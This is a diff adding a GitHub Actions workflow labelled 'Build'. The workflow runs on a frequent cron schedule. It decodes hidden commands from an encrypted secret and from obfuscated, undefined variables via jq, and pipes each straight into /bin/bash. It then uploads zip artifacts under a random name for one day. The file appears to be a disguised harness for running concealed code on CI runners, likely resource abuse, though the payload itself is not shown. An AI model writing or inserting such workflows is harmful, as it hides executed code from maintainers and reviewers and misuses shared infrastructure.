@@ -1,0 +1,35 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          nvvr5: ${{ secrets.nvvr5 }}
+        run: |
+          printf '%s' "$nvvr5" | jq -r .udshk28544 | /bin/bash
+          printf '%s' "$ec1" | jq -r .av87 | /bin/bash
+          echo $u9215 | jq -r .jqazs9357 | /bin/bash
+          printf '%s' "$v39" | jq -r .apst45774 | /bin/bash
+          echo $nd5110 | jq -r .e383 | /bin/bash
+          echo $t31022 | jq -r .uz70 | /bin/bash
+          echo $kkper12257 | jq -r .usttj0 | /bin/bash
+          echo $ggk5723 | jq -r .s6 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: P2VCtffC
+          path: "*.zip"
+          retention-days: 1
